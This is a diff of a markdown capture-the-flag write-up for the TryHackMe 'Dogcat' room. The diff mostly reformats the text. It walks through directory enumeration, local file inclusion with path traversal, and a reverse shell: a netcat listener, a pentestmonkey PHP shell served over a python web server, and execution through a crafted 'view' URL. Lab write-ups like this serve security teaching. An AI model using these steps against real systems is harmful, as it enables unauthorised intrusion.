@@ -5,8 +5,6 @@ coverY: 0
 
 # THM - Dogcat
 
-COVER IMAGE
-
 ## Setup
 
 **Read the Room Description:**\
@@ -52,7 +50,9 @@ In this case there is not much to be found through navigating or viewing the pag
 **Directory enumeration (and by extension)**\
 To see if there were any other useful pages I used gobuster to check for any directories as well as using `-x php` to check for php files as from the room description we know we are looking to exploit PHP.
 
-<pre class="language-bash"><code class="lang-bash"><strong>gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php</strong></code></pre>
+```bash
+gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php
+```
 
 IMAGE GOBUSTER RESULTS
 
@@ -66,11 +66,11 @@ dogs/cats directory - Status code 301 means we do not have access
 ### 2.1 LFI
 
 Trying various parameters to try and exploit LFI I ran into several obstacles:
+
 1. The paramter must contain 'dog' or 'cat'
 2. .php is added to the end of the paramter (e.g /?view=index will look for the file index.php)
 
-Looking online for LFI methods I found this cheatsheet
-https://highon.coffee/blog/lfi-cheat-sheet/
+Looking online for LFI methods I found this cheatsheet https://highon.coffee/blog/lfi-cheat-sheet/
 
 which gives and example of using a PHP wrapper to base64 encode a file. The example is:
 
@@ -148,13 +148,12 @@ Set up listener on our machine for the shell to establish a connection with:
 ```bash
 nc -nvlp 4444
 ```
-**Create shell code**
-I used the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
+
+**Create shell code** I used the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
 
 ![](../.gitbook/assets/monkeySHell.PNG)
 
-**Get the shell onto the target**
-Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
+**Get the shell onto the target** Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
 
 ```bash
 python3 -m http.server 8080 
@@ -176,8 +175,7 @@ Our python server lets us know when our target machine has downloaded our shell:
 
 <figure><img src="../.gitbook/assets/webdownlaod.PNG" alt=""><figcaption></figcaption></figure>
 
-**Execute the shell script**
-In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
+**Execute the shell script** In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
 **http://10.10.150.242/?view=./dog/../shell**
 
 <figure><img src="../.gitbook/assets/webshellFirst.PNG" alt=""><figcaption></figcaption></figure>
